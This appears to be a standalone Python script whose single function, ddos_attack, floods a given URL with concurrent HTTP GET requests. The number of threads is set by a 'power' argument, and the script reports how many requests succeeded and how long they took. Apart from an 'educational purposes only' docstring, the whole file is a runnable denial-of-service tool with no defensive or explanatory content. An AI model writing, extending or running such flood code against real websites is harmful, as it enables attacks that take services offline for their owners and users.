import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

def ddos_attack(url, power):
    """
    Simulate a DDoS attack by sending concurrent requests to a target URL.
    This is for educational purposes only.
    """
    def send_request(url):
        try:
            response = requests.get(url, timeout=5)
            return response.status_code
        except requests.exceptions.RequestException as e:
            return str(e)

    try:
        # Convert power to integer
        num_threads = int(power)

        start_time = time.time()
        results = []

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            # Submit all requests
            future_to_index = {executor.submit(send_request, url): i for i in range(num_threads)}

            # Collect results as they complete
            for future in as_completed(future_to_index):
                try:
                    result = future.result()
                    results.append(result)
                    print(f"Thread completed with result: {result}")
                except Exception as e:
                    results.append(f"Error: {str(e)}")
                    print(f"Thread failed with error: {str(e)}")

        end_time = time.time()
        duration = end_time - start_time

        # Count successful requests
        successful_requests = sum(1 for r in results if isinstance(r, int) and r == 200)

        print(f"DDoS simulation completed in {duration:.2f} seconds")
        print(f"Successful requests: {successful_requests}/{num_threads}")

        return f"Sent {num_threads} concurrent requests in {duration:.2f} seconds"

    except Exception as e:
        print(f"Error in DDoS attack: {str(e)}")
        return f"Attack failed: {str(e)}"
